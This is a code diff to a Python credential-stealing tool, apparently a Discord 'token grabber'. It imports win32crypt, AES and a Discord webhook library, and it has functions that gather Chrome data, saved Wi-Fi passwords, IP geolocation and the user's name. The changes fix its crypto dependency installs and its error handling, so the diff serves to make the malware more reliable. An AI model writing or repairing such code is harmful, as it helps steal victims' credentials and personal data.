@@ -67,6 +67,8 @@ PATHS = {
 }
 def install (package):
     subprocess. check_call ([sys. executable, "-m", "pip", "install", package])
+def uninstall (package):
+    subprocess. check_call ([sys. executable, "-m", "pip", "uninstall", package])
 try:
 	import win32crypt
 	from dhooks import Webhook, File
@@ -104,7 +106,9 @@ except ImportError or NameError or ModuleNotFoundError:
 try:
     from Crypto.Cipher import AES
 except ImportError or NameError or ModuleNotFoundError:
-    install('cryptography')
+	uninstall('crypto')
+	uninstall('pycrypto')
+	install('pycryptodome')
 
 
 sysinfo = f"""
@@ -215,7 +219,7 @@ def chrome():
 	db.close()
 	try:
 		os.remove(filename)
-		os.remove(comepleteName)
+		#os.remove(comepleteName)
 	except:
 		pass
 		f.close()
@@ -288,8 +292,11 @@ def tokengrabber():
 	getwifinetwork,getwifipassword = getwifi().split('|')
 	try:
 		chrome_dump = chrome()
-	except:
-		chrome_dump = 'Not Available'
+	except Exception as e:
+		print(e)
+		with open(comepleteName,'w') as l:
+			l.write('not available\n')
+			l.write(str(e))
 	getchromefile = get_chrome_file()
 	ip,org,loc,city,country,region,googlemap = getip()
 	pc_username = os.getenv("UserName")
